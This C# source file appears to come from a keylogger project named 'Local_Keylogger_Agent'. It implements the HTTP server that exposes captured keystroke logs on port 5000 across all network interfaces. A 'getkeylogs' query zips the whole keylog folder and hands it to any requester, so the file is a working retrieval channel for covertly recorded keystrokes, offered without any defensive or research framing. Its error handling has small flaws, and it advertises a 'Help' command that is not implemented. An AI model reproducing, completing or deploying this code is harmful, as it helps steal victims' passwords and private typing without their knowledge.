using System.IO.Compression;
using System.Net;
using System.Text;

namespace Local_Keylogger_Agent
{
    internal class HTTPServer
    {
        private HttpListener httpListener;
        public static uint HTTPort = 5000; // Port for the HTTP server

        public void StartHTTPServer()
        {
            httpListener = new HttpListener();
            httpListener.Prefixes.Add($"http://+:{HTTPort}/"); // Set the prefix for the HTTP server
            httpListener.Start();

            Task.Run(async () =>
            {
                while (httpListener.IsListening)
                {
                    try
                    {
                        HttpListenerContext context = await httpListener.GetContextAsync();
                        _ = Task.Run(async () => await HandleRequest(context));
                    }
                    catch (HttpListenerException ex)
                    {
                        break; // Exit the loop if the listener is stopped
                    }
                }
            });
        }
        private async Task HandleRequest(HttpListenerContext context)
        {
            // Handle the incoming request here
            HttpListenerRequest request = context.Request;
            HttpListenerResponse response = context.Response;

            string action = request.QueryString["action"] ?? string.Empty;

            switch(action.ToLower())
            {
                case "info":
                    WriteResponse(response, "Local Keylogger Agent is running.");
                    break;
                
                case "getkeylogs":
                    await SendLogsArchiveAsync(response);
                    break;

                default:
                    WriteResponse(response, $"Unknown Command: {action} : Enter \"Help\" to list available commands...");
                    break;
            }

            response.OutputStream.Close();
        }



        private async Task SendLogsArchiveAsync(HttpListenerResponse response)
        {
            string folderpPath = Storage.BaseKeylogFilePath;

            if(!Directory.Exists(folderpPath))
            {
                response.StatusCode = (int)HttpStatusCode.NotFound; // 404 Not Found
                WriteResponse(response, "Keylog directory not found.");
                return;
            }

            using var memoryStream = new MemoryStream();
            using (var zip = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
            {
                foreach (var file in Directory.GetFiles(folderpPath))
                {
                    var entry = zip.CreateEntry(Path.GetFileName(file), CompressionLevel.Fastest);
                    using var entryStream = entry.Open();
                    using var fileStream = File.OpenRead(file);
                    await fileStream.CopyToAsync(entryStream);
                }
            }

            memoryStream.Position = 0; // Reset the stream position

            //send the zip file as response
            response.ContentType = "application/zip"; // MIME type for zip files
            response.ContentLength64 = memoryStream.Length; // Set the content length
            response.StatusCode = (int)HttpStatusCode.OK; // 200 OK
            await memoryStream.CopyToAsync(response.OutputStream); // Write the zip file to the response stream
            response.OutputStream.Close(); // Close the output stream
        }



        public static void WriteResponse(HttpListenerResponse response, string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            response.ContentType = "text/plain; charset=utf-8";  // MIME‑тип
            response.ContentLength64 = buffer.Length;              // длина тела
            response.StatusCode = (int)HttpStatusCode.OK;       // код 200
            response.OutputStream.Write(buffer, 0, buffer.Length); // запись в поток
        }
    }
}
